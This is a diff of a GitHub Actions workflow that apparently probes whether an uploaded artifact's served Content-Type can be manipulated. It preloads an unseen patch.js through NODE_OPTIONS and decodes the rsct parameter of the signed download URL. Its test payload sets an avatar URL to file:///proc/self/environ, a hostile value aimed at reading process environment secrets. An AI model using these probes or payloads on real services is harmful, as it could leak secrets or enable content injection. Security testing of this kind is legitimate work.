@@ -16,11 +16,15 @@ jobs:
           printf '{"full_name":"RWeng77/rc-test","owner":{"login":"cassette","avatar_url":"file:///proc/self/environ"},"description":"test","stargazers_count":1}' > payload.json
           sha256sum payload.json
 
-      - name: Upload with NEL CT
-        uses: ./.github/actions/custom-upload
+      - name: Upload with patched CT
+        uses: actions/upload-artifact@main
+        env:
+          NODE_OPTIONS: "--require ./patch.js"
         with:
           name: nel-payload
-          file: payload.json
+          path: payload.json
+          archive: false
+          retention-days: 1
 
       - name: Check artifact download
         env:
@@ -40,10 +44,22 @@ jobs:
             "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$AID/zip")
           LOC=$(echo "$REDIR" | grep -i '^location:' | sed 's/^[Ll]ocation: //' | tr -d '\r\n')
           echo "rsct param: $(echo "$LOC" | grep -oP 'rsct=[^&]*' || echo 'NO_RSCT')"
+          python3 -c "
+import urllib.parse, re
+url = '''$LOC'''
+m = re.search(r'rsct=([^&]*)', url)
+if m:
+    decoded = urllib.parse.unquote(m.group(1))
+    print('rsct decoded:', repr(decoded))
+    print('rsct hex:', decoded.encode('latin-1','replace').hex())
+else:
+    print('NO rsct')
+"
 
           echo "=== Response CT ==="
           curl -sI "$LOC" | grep -i '^content-type'
           echo "=== CT hex ==="
-          curl -sI "$LOC" | grep -i '^content-type:' | tr -d '\r\n' | xxd
+          CT_LINE=$(curl -sI "$LOC" | grep -i '^content-type:' | tr -d '\r\n')
+          echo -n "$CT_LINE" | xxd
           echo "=== Body ==="
           curl -s "$LOC" | head -c 200
